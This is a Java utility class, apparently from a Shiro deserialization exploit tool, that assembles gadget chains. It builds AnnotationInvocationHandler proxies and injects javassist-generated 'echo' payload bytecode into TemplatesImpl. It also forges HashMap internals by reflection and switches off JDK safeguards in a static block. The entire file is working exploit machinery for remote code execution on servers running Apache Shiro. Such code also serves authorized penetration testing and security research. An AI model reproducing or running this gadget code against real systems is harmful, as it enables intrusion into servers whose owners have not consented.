package com.sma11new.exp.shiro.attack.util;

import com.sma11new.exp.shiro.attack.echo.EchoPayload;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class Gadgets {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?> ... ifaces) throws Exception {
        return Gadgets.createProxy(Gadgets.createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
        return (InvocationHandler)Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?> ... ifaces) {
        Class[] allIfaces = (Class[])Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(String key, Object val) {
        HashMap<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(String classpayload) throws Exception {
        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? Gadgets.createTemplatesImpl(classpayload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet")) : Gadgets.createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class);
    }

    public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet) throws Exception {
        T templates = tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        Class<? extends EchoPayload> echoClazz = EchoPayload.Utils.getPayloadClass(payload);
        EchoPayload echoObj = echoClazz.newInstance();
        CtClass clazz = echoObj.genPayload(pool);
        CtClass superClass = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superClass);
        byte[] classBytes = clazz.toBytecode();
        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bcField.setAccessible(true);
        bcField.set(templates, new byte[][]{classBytes});
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "a");
        return templates;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Class<?> nodeC;
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException var6) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }
}

